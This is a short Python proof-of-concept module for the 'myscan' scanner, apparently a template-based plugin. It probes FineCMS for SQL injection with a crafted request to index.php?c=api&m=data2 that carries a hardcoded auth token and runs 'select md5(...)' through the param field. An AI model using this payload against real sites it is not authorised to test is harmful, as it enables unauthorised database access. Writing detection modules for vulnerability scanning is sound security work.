#!/usr/bin/env python3
# @Time    : 2020-05-11
# @Author  : caicai
# @File    : poc_finecms-sqli_2019.py

'''未验证'''

# 此脚本为编写perfloder的poc模板，编写poc时复制一份此模版为pocname即可，用户可在verify方法下添加自己代码
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.common import get_random_num,getmd5



class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "finecms-sqli"
        self.vulmsg = "referer: https://blog.csdn.net/dfdhxb995397/article/details/101385340"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        random_int=get_random_num(5)
        req = {
            "method": "GET",
            "url": self.url+"index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({})%27".format(random_int),
            "headers":self.dictdata.get("request").get("headers"),
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r != None and r.status_code == 200 and (getmd5(random_int)[10:20]).encode() in r.content:
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })